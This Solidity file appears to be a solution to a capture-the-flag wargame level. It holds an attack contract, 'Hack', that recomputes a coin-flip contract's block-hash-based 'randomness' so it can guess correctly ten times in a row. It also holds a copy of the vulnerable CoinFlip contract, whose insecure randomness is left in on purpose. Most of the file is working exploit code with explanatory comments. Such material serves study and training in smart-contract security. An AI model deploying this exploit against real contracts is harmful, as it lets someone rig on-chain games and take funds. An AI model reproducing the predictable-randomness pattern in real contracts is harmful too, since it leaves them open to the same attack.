// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Objective: Guess 10 times the coin value.

// We create a Hack contract that will call the original contract
contract Hack {
    CoinFlip private immutable target;
    // The factor is the same than the hacked contract.
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        // Instance the target when deployed.
        target = CoinFlip(_target);
    }

    // This is the function we are going to call 10 times.
    function flip() external {
        bool guess = _guess();
        require(target.flip(guess), "Failed guess");
    }

    function _guess() private view returns (bool) {
        // This calculates the same blockvalue as the original contract
        uint256 blockValue = uint256(blockhash(block.number - 1));
        // This is a copy of the logic inside original contract, with this the
        // value computed with blockValues / FACTOR should be the same
        // as the original contract, so we will be sending the same
        // value that side contiains.
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
